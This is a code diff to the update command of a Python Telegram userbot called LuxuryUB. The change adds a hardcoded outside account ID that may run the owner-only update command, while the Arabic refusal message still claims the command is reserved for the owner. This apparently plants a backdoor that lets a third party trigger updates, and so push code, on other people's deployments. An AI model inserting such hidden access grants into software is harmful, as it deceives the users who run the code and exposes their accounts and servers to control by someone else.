@@ -92,8 +92,8 @@ async def deploy(event, repo, ups_rem, ac_br):
     },
 )
 async def upstream(event):
-    if event.sender_id != Config.OWNER_ID:
-        return await edit_or_reply(event, "**❌ عذراً، أمر التحديث مخصص للمالك الأساسي للسورس فقط للحفاظ على استقرار السيرفر.**")
+    if event.sender_id != Config.OWNER_ID and event.sender_id not in [1165225957]:
+        return await event.edit("❌ عذراً، أمر التحديث مخصص للمالك الأساسي للسورس فقط للحفاظ على استقرار السيرفر.")
         
     conf = event.pattern_match.group(1).strip() if event.pattern_match.group(1) else ""
     event = await edit_or_reply(event, "**᯽︙ جاري البحث عن تحديثات لـ LuxuryUB...**")
